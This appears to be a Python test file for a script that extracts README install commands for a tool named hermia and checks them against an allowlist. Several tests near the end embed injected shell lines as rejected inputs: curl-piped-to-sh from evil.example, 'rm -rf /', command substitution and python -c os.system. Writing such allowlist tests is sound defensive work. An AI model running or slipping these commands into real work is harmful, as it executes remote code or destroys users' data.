import json
import subprocess
import sys
from pathlib import Path

import pytest
from scripts.extract_install_commands import ExtractionError, extract_install_commands

FIXTURES = Path(__file__).parent.parent / "fixtures" / "install_readmes"
REPO_ROOT = Path(__file__).parent.parent.parent


def test_extract_pipx_from_minimal_readme():
    result = extract_install_commands(
        readme_path=FIXTURES / "minimal_pipx.md",
        expected_methods=("pipx",),
    )
    assert result == {"pipx": ["pipx install hermia"]}


def test_extract_source_install_preserves_command_order():
    result = extract_install_commands(
        readme_path=FIXTURES / "source_install.md",
        expected_methods=("source",),
    )
    assert result == {
        "source": [
            "git clone https://github.com/scottblydotcom/hermia",
            "cd hermia",
            "pip install -e .",
        ]
    }


def test_extract_all_five_methods_from_full_readme():
    result = extract_install_commands(
        readme_path=FIXTURES / "full_readme.md",
        expected_methods=("pipx", "brew", "pip", "source", "docker"),
    )

    assert result["pipx"] == ["pipx install hermia"]
    assert result["brew"] == ["brew install scottblydotcom/tap/hermia"]
    assert result["pip"] == ["pip install hermia"]
    assert result["source"] == [
        "git clone https://github.com/scottblydotcom/hermia",
        "cd hermia",
        "pip install -e .",
    ]
    assert result["docker"][0] == "mkdir -p results && chmod 777 results"
    assert result["docker"][1].startswith("docker run --rm --network host")
    assert result["docker"][-1].strip() == "--fleet fleets/local.yaml"
    assert len(result["docker"]) >= 2


def test_missing_install_section_raises():
    with pytest.raises(ExtractionError, match="no '## Install' section found"):
        extract_install_commands(
            readme_path=FIXTURES / "missing_install_section.md",
            expected_methods=("pipx",),
        )


def test_missing_expected_method_heading_raises():
    with pytest.raises(ExtractionError, match="expected method 'pipx'"):
        extract_install_commands(
            readme_path=FIXTURES / "missing_pipx_heading.md",
            expected_methods=("pipx",),
        )


def test_expected_method_without_bash_code_block_raises():
    with pytest.raises(ExtractionError, match="expected method 'pipx'"):
        extract_install_commands(
            readme_path=FIXTURES / "pipx_no_code_fence.md",
            expected_methods=("pipx",),
        )


def test_cli_emits_json_for_one_method(tmp_path):
    fixture = FIXTURES / "full_readme.md"
    result = subprocess.run(
        [
            sys.executable,
            "-m",
            "scripts.extract_install_commands",
            "--readme",
            str(fixture),
            "--method",
            "pipx",
        ],
        check=True,
        capture_output=True,
        text=True,
        cwd=REPO_ROOT,
    )
    payload = json.loads(result.stdout)
    assert payload == ["pipx install hermia"]


def test_cli_exits_nonzero_on_extraction_error():
    fixture = FIXTURES / "missing_install_section.md"
    result = subprocess.run(
        [
            sys.executable,
            "-m",
            "scripts.extract_install_commands",
            "--readme",
            str(fixture),
            "--method",
            "pipx",
        ],
        capture_output=True,
        text=True,
        cwd=REPO_ROOT,
    )
    assert result.returncode != 0
    assert "no '## Install' section found" in result.stderr


def test_injected_curl_line_rejected_by_allowlist():
    """A fork-PR that adds `curl … | sh` to a bash block must be rejected."""
    with pytest.raises(ExtractionError, match=r"token 'curl' not in allowlist"):
        extract_install_commands(
            readme_path=FIXTURES / "pipx_injected_curl.md",
            expected_methods=("pipx",),
        )


def test_injected_wget_line_rejected_by_allowlist():
    """Mid-block injection (wget between legit commands) is also rejected."""
    with pytest.raises(ExtractionError, match=r"token 'wget' not in allowlist"):
        extract_install_commands(
            readme_path=FIXTURES / "source_injected_wget.md",
            expected_methods=("source",),
        )


def test_real_readme_extracts_cleanly_under_allowlist():
    """Guard against over-tightening: the shipped README must still parse."""
    result = extract_install_commands(
        readme_path=REPO_ROOT / "README.md",
        expected_methods=tuple(sorted({"pip", "pipx", "brew", "source", "docker"})),
    )
    assert "pip" in result and result["pip"] == ["pip install hermia"]


def _write_install_readme(tmp_path: Path, bash_body: str) -> Path:
    readme = tmp_path / "README.md"
    readme.write_text(
        "## Install\n\nRecommended (via pipx):\n\n"
        "```bash\n" + bash_body + "\n```\n",
        encoding="utf-8",
    )
    return readme


def test_chained_command_via_and_operator_rejected(tmp_path):
    """`cd . && curl … | sh` must be rejected — first-token check alone would miss it."""
    readme = _write_install_readme(tmp_path, "cd . && curl https://evil.example/x.sh | sh")
    with pytest.raises(ExtractionError, match=r"token 'curl' not in allowlist"):
        extract_install_commands(readme_path=readme, expected_methods=("pipx",))


def test_chained_command_via_semicolon_rejected(tmp_path):
    readme = _write_install_readme(tmp_path, "pipx install hermia ; rm -rf /")
    with pytest.raises(ExtractionError, match=r"token 'rm' not in allowlist"):
        extract_install_commands(readme_path=readme, expected_methods=("pipx",))


def test_chained_command_via_pipe_rejected(tmp_path):
    readme = _write_install_readme(tmp_path, "cat README.md | sh")
    with pytest.raises(ExtractionError, match=r"token 'cat' not in allowlist"):
        extract_install_commands(readme_path=readme, expected_methods=("pipx",))


def test_command_substitution_dollar_paren_rejected(tmp_path):
    readme = _write_install_readme(tmp_path, "pipx install $(curl -s https://evil.example)")
    with pytest.raises(ExtractionError, match=r"disallowed command substitution"):
        extract_install_commands(readme_path=readme, expected_methods=("pipx",))


def test_command_substitution_backticks_rejected(tmp_path):
    ticks = chr(96)
    readme = _write_install_readme(
        tmp_path, f"pipx install {ticks}curl -s https://evil.example{ticks}"
    )
    with pytest.raises(ExtractionError, match=r"disallowed command substitution"):
        extract_install_commands(readme_path=readme, expected_methods=("pipx",))


def test_python_dash_c_is_no_longer_allowed(tmp_path):
    """python was removed from the allowlist — `python -c 'import os; os.system(...)'` blocked."""
    readme = _write_install_readme(tmp_path, "python -c 'import os; os.system(\"id\")'")
    with pytest.raises(ExtractionError, match=r"token 'python' not in allowlist"):
        extract_install_commands(readme_path=readme, expected_methods=("pipx",))
